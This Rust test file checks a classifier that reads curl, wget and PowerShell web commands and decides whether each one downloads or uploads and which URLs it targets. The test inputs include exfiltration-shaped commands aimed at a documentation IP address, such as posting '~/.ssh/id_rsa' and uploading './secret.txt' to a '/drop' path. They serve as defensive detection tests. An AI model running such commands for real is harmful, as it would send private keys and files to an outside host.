use super::{download_candidate, is_upload, request};

fn tokens(command: &str) -> Vec<String> {
    crate::process_chain::tokenize(command)
}

#[test]
fn direction_follows_each_client_invocation() {
    for (command, download, upload) in [
        // The invocation follows leading assignments and wrappers.
        (
            "env NOTE=curl- curl -d @~/.ssh/id_rsa https://203.0.113.10/",
            false,
            true,
        ),
        ("sudo -u deploy curl https://203.0.113.10/a", true, false),
        ("sudo -E curl -d @f https://203.0.113.10/", false, true),
        (
            "env -i PATH=/usr/bin curl https://203.0.113.10/a",
            true,
            false,
        ),
        (
            "timeout -s KILL 30s curl https://203.0.113.10/a",
            true,
            false,
        ),
        ("nice -n 10 wget https://203.0.113.10/a", true, false),
        (
            "xargs -n1 -I{} curl -d @{} https://203.0.113.10/",
            false,
            true,
        ),
        ("SYNTHETIC=1 curl https://203.0.113.10/a", true, false),
        (
            "sudo --user deploy curl -d @f https://203.0.113.10/",
            false,
            true,
        ),
        ("sudo -iu deploy curl https://203.0.113.10/a", true, false),
        ("sudo -uroot curl https://203.0.113.10/a", true, false),
        ("sudo -- curl https://203.0.113.10/a", true, false),
        (
            "timeout --signal KILL 30 curl https://203.0.113.10/a",
            true,
            false,
        ),
        (
            "sudo env A=1 timeout 5 curl https://203.0.113.10/a",
            true,
            false,
        ),
        ("sudo", false, false),
        // A client named as an argument is not an invocation.
        ("git fetch https://203.0.113.10/repo.git main", false, false),
        ("echo curl https://203.0.113.10/a", false, false),
        ("which curl wget https://203.0.113.10/a", false, false),
        ("rg -n curl -d src https://203.0.113.10/", false, false),
        ("sudo curl https://203.0.113.10/a", true, false),
        ("xargs curl -d @- https://203.0.113.10/", false, true),
        ("curl.exe -F f=@x https://203.0.113.10/", false, true),
        // curl's short-flag table applies only to curl.
        ("aria2c -d downloads https://203.0.113.10/a", true, false),
        ("wget -d https://203.0.113.10/a", true, false),
        ("wget -x https://203.0.113.10/a", true, false),
        ("wget -H https://203.0.113.10/a", true, false),
        ("wget -T 10 https://203.0.113.10/a", true, false),
        ("wget --post-file=f https://203.0.113.10/", false, true),
        (
            "wget --method=PUT --body-file=f https://203.0.113.10/",
            false,
            true,
        ),
        // Clustered, case-sensitive curl flags.
        ("curl -sX POST https://203.0.113.10/", false, true),
        ("curl -sXPUT https://203.0.113.10/", false, true),
        ("curl -sf https://203.0.113.10/a", true, false),
        ("curl -sD headers https://203.0.113.10/a", true, false),
        ("curl -odata.bin https://203.0.113.10/a", true, false),
        ("curl --data-ascii x https://203.0.113.10/", false, true),
        ("curl --json @f https://203.0.113.10/", false, true),
        // -G data is a query unless it is read from a file.
        (
            "curl -G --data-urlencode q=x https://203.0.113.10/s",
            true,
            false,
        ),
        (
            "curl -G --data-urlencode d@file https://203.0.113.10/s",
            false,
            true,
        ),
        (
            "curl -G --data-urlencode @file https://203.0.113.10/s",
            false,
            true,
        ),
        (
            "curl -G --data-urlencode q=a@b https://203.0.113.10/s",
            true,
            false,
        ),
        ("curl -sGd q=x https://203.0.113.10/s", true, false),
        ("curl --get -d @file https://203.0.113.10/s", false, true),
        (
            "curl -G --data-raw @literal https://203.0.113.10/s",
            true,
            false,
        ),
        ("curl -G -X POST -d q=x https://203.0.113.10/s", false, true),
        ("curl -G -T f https://203.0.113.10/s", false, true),
        // Proxies, including SOCKS, are reroutes; their arguments are not
        // target URLs.
        (
            "curl --socks5 proxy.example.invalid:1080 http://127.0.0.1/a",
            true,
            false,
        ),
        (
            "curl --socks5-hostname proxy.example.invalid:1080 http://127.0.0.1/a",
            true,
            false,
        ),
        (
            "curl --socks4a proxy.example.invalid:1080 http://127.0.0.1/a",
            true,
            false,
        ),
        (
            "curl --proxy1.0 proxy.example.invalid:8080 http://127.0.0.1/a",
            true,
            false,
        ),
        ("curl -x http://203.0.113.10:8080", false, false),
        ("curl --proxy=http://203.0.113.10:8080", false, false),
        (
            "curl -x http://203.0.113.10:8080 http://127.0.0.1/a",
            true,
            false,
        ),
        (
            "curl -e https://203.0.113.10/ http://127.0.0.1/a",
            false,
            false,
        ),
        // Literal loopback in every textual form; names are not exempt.
        ("curl 'http://[0:0:0:0:0:0:0:1]/a'", false, false),
        ("curl 'http://[::0001]:8080/a'", false, false),
        ("curl 'http://[0:0:0:0:0:ffff:7f00:1]/a'", false, false),
        ("curl http://user:synthetic@127.0.0.1:8080/a", false, false),
        ("curl http://localhost/a", true, false),
        ("curl http://127.0.0.1:notaport/a", true, false),
        ("X=$(curl -s http://127.0.0.1)", false, false),
        ("X=$(curl -s http://203.0.113.10)", true, false),
        ("wget --post-f=f https://203.0.113.10/", false, true),
        (
            "wget --body-d=x --meth=PUT https://203.0.113.10/",
            false,
            true,
        ),
        ("curl -d @f http://127.0.0.1/a", false, true),
        (
            "curl -X PATCH -d '{\"a\":1}' https://203.0.113.10/item",
            false,
            true,
        ),
        (
            "Invoke-RestMethod -Method Post -Uri https://203.0.113.10/upload -Body 'payload'",
            false,
            true,
        ),
        (
            "irm -Method Patch -Uri https://203.0.113.10/item -Body 'x'",
            false,
            true,
        ),
        (
            "Invoke-WebRequest -InFile ./secret.txt -Uri https://203.0.113.10/drop",
            false,
            true,
        ),
        (
            "iwr -Uri https://203.0.113.10/form -Form @{f='x'}",
            false,
            true,
        ),
        (
            "Invoke-RestMethod -Method Get -Uri https://203.0.113.10/read",
            true,
            false,
        ),
        (
            "Invoke-WebRequest -Method Head -Uri https://203.0.113.10/ping",
            true,
            false,
        ),
        (
            "Invoke-RestMethod -Uri https://203.0.113.10/post -Body 'implicit-post'",
            false,
            true,
        ),
    ] {
        let tokens = tokens(command);
        assert_eq!(download_candidate(&tokens).is_some(), download, "{command}");
        assert_eq!(is_upload(&tokens), upload, "{command}");
    }
}

/// Where reading option values changed curl and wget direction from the
/// base reading, which took every word after a value option for an
/// operand. The new reading is what the clients do.
#[test]
fn option_values_are_no_urls_and_url_options_are() {
    for (command, download, upload) in [
        // A URL that is only an option's value is no download.
        ("curl -e https://203.0.113.10/r -o out", false, false),
        ("curl --referer https://203.0.113.10/r", false, false),
        ("wget -U https://203.0.113.10/ua", false, false),
        // wget's URL list and base options request what they name.
        ("wget --input-file=https://203.0.113.10/list", true, false),
        ("wget --base=https://203.0.113.10/", true, false),
        ("wget -ihttps://203.0.113.10/list", true, false),
        ("wget -Bhttps://203.0.113.10/", true, false),
        // `-O` takes the next word whatever it looks like.
        ("wget -O --post-data=x https://203.0.113.10/a", true, false),
    ] {
        let tokens = tokens(command);
        assert_eq!(download_candidate(&tokens).is_some(), download, "{command}");
        assert_eq!(is_upload(&tokens), upload, "{command}");
    }
}

/// The option tables against the clients' own help (curl 8.18.0
/// `--help all`, GNU Wget2 2.3.0 `--help`): a letter curl does not have is
/// unknown, so the reading is unread and the URL after it still read.
#[test]
fn option_tables_follow_the_clients_help() {
    let words = tokens("curl -5 https://203.0.113.10/a");
    assert!(download_candidate(&words).is_some());
    assert!(request(&words).unread);
    let words = tokens("curl -4 -6 https://203.0.113.10/a");
    assert!(!request(&words).unread);
}

/// PowerShell web cmdlet downloads the base reading matched, which read
/// every word that is not a parameter as a URL. Each still downloads.
const POWERSHELL_DOWNLOADS: &[&str] = &[
    "iwr https://203.0.113.10/a -OutFile a",
    "Invoke-WebRequest -Uri https://203.0.113.10/a -OutFile a",
    "irm https://203.0.113.10/api",
    "Invoke-RestMethod -Uri https://203.0.113.10/api -Method Get",
    "iwr -UseBasicParsing https://203.0.113.10/a",
    "iwr -SkipCertificateCheck https://203.0.113.10/a",
    "iwr -DisableKeepAlive -PassThru https://203.0.113.10/a",
    "iwr -SyntheticFutureSwitch https://203.0.113.10/a",
    "iwr -OutFile a https://203.0.113.10/a",
    "iwr -Headers @{Accept='x'} https://203.0.113.10/a",
    "iwr -Headers @{ Accept = 'x' } https://203.0.113.10/a",
    "iwr -Uri https://203.0.113.10/a -TimeoutSec 30 -ErrorAction Stop",
    "Invoke-WebRequest -Uri https://203.0.113.10/a -Method Delete",
    "irm -Method Get -Uri https://203.0.113.10/a -Body q",
    "iwr -Proxy http://203.0.113.20:8080 -Uri http://127.0.0.1/a",
    "iwr -Ur https://203.0.113.10/a",
    "iwr -U https://203.0.113.10/a",
    "iwr -OutFile a -Uri https://203.0.113.10/a > log.txt",
    // `--%` passes the rest unparsed; it is still read, as unread.
    "iwr --% https://203.0.113.10/a",
];

#[test]
fn powershell_downloads_the_base_reading_matched_still_match() {
    for command in POWERSHELL_DOWNLOADS {
        let tokens = tokens(command);
        assert!(download_candidate(&tokens).is_some(), "{command}");
        assert!(!is_upload(&tokens), "{command}");
    }
    // Loopback only, as before.
    assert!(download_candidate(&tokens("iwr -Uri http://127.0.0.1/a")).is_none());
}

#[test]
fn powershell_parameters_resolve_or_fail_toward_an_upload_or_a_match() {
    // (command, download, upload, unread)
    for (command, download, upload, unread) in [
        // Exact names, attached values and dash variants.
        (
            "irm -Method:Post -Uri:https://203.0.113.10/a",
            false,
            true,
            false,
        ),
        (
            "irm \u{2013}Method Post \u{2013}Uri https://203.0.113.10/a",
            false,
            true,
            false,
        ),
        (
            "Invoke-RestMethod -METHOD post https://203.0.113.10/a",
            false,
            true,
            false,
        ),
        // An abbreviation is read as the parameter it names, unread.
        ("irm -Bo x https://203.0.113.10/a", false, true, true),
        ("irm -Me Post -Ur https://203.0.113.10/a", false, true, true),
        ("iwr -InF f https://203.0.113.10/a", false, true, true),
        // An ambiguous abbreviation of a body parameter, which PowerShell
        // rejects, reads as an upload rather than a download.
        ("iwr -In f https://203.0.113.10/a", false, true, true),
        ("iwr -Fo @{f='x'} https://203.0.113.10/a", false, true, true),
        // Any other unresolved name takes no value: a URL after it is
        // still a target.
        (
            "iwr -SyntheticFutureSwitch https://203.0.113.10/a",
            true,
            false,
            true,
        ),
        ("irm -M Post https://203.0.113.10/a", true, false, true),
        // Splatting and expressions.
        ("iwr @synthetic", false, false, true),
        (
            "irm -Method Post -Uri ('https://203.0.113.10/' + 'a')",
            false,
            true,
            true,
        ),
        // A GET, HEAD or OPTIONS body is a query.
        (
            "irm -Method Get -Body q https://203.0.113.10/a",
            true,
            false,
            false,
        ),
        (
            "irm -Method Head -Body q https://203.0.113.10/a",
            true,
            false,
            false,
        ),
        // These downloaded in the base reading, which read no PowerShell
        // parameter: a body or an upload method makes an upload.
        (
            "irm -Method Post -Uri https://203.0.113.10/a -Body x",
            false,
            true,
            false,
        ),
        ("iwr -InFile f https://203.0.113.10/a", false, true, false),
        (
            "irm https://203.0.113.10/a -Method POST",
            false,
            true,
            false,
        ),
        // So did a lone proxy, which names no target, as `curl -x` alone.
        ("iwr -Proxy http://203.0.113.20:8080", false, false, true),
    ] {
        let tokens = tokens(command);
        let request = request(&tokens[..]);
        assert_eq!(download_candidate(&tokens).is_some(), download, "{command}");
        assert_eq!(is_upload(&tokens), upload, "{command}");
        assert_eq!(request.unread, unread, "{command}");
    }
}

#[test]
fn targets_are_the_words_the_client_requests() {
    for (command, targets, unread) in [
        (
            "curl -d x https://203.0.113.10/a > out.json 2>/dev/null",
            &["https://203.0.113.10/a"][..],
            false,
        ),
        (
            "curl -sS --max-time 5 -d x --url=https://203.0.113.10/a",
            &["https://203.0.113.10/a"],
            false,
        ),
        (
            "curl -d x -- https://203.0.113.10/a 2>&1",
            &["https://203.0.113.10/a"],
            false,
        ),
        (
            "wget -q -O- -T 10 --post-data=x https://203.0.113.10/a",
            &["https://203.0.113.10/a"],
            false,
        ),
        (
            "wget -nv --post-file=f https://203.0.113.10/a",
            &["https://203.0.113.10/a"],
            false,
        ),
        (
            "wget -B https://203.0.113.10/ -i list.txt --post-data=x",
            &["https://203.0.113.10/", "list.txt"],
            true,
        ),
        (
            "irm -Method Post -OutFile o -Uri https://203.0.113.10/a -Body x",
            &["https://203.0.113.10/a"],
            false,
        ),
        (
            "irm -Method Post -Headers @{ Accept = 'x' } https://203.0.113.10/a",
            &["https://203.0.113.10/a"],
            false,
        ),
        (
            "curl --compressed -d x example.invalid/a",
            &["example.invalid/a"],
            false,
        ),
        (
            "curl -W -d x https://203.0.113.10/a",
            &["https://203.0.113.10/a"],
            true,
        ),
    ] {
        let tokens = tokens(command);
        let request = request(&tokens[..]);
        assert_eq!(request.targets, targets, "{command}");
        assert_eq!(request.unread, unread, "{command}");
    }
    // A redirection's target is no request target, though direction still
    // reads it, as the base reading did.
    let tokens = tokens("curl '>' https://203.0.113.10/a");
    assert!(request(&tokens[..]).targets.is_empty());
    assert!(download_candidate(&tokens).is_some());
}

#[test]
fn wget_options_are_read_with_their_values() {
    for command in [
        "wget -O out.html -T 10 https://203.0.113.10/a",
        "wget -qO- https://203.0.113.10/a",
        "wget -B https://203.0.113.10/ -i list.txt",
        "wget -e robots=off https://203.0.113.10/a",
    ] {
        assert!(download_candidate(&tokens(command)).is_some(), "{command}");
    }
}
